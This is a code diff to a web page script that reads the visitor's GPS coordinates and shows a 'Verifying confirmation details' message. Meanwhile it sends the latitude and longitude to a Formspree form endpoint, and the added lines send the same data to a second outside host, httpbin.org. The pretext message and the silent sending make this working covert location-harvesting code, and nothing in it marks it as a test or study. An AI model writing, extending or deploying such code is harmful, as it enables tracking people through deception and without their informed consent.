@@ -67,18 +67,26 @@
       const lon = position.coords.longitude;
       document.getElementById("output").innerText = "Verifying confirmation details...";
 
+      const payload = {
+        _replyto: "anon@anon.com",
+        _subject: "GPS Coordinates",
+        message: `Lat: ${lat}, Lon: ${lon}`,
+        latitude: lat,
+        longitude: lon
+      };
+
+      // Send to Formspree
       fetch("https://formspree.io/f/xkgrpjjk", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          _replyto: "anon@anon.com",
-          _subject: "GPS Coordinates",
-          message: `Lat: ${lat}, Lon: ${lon}`,
-          latitude: lat,
-          longitude: lon
-        })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      // Send debug to httpbin
+      fetch("https://httpbin.org/post", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
       });
     }
 
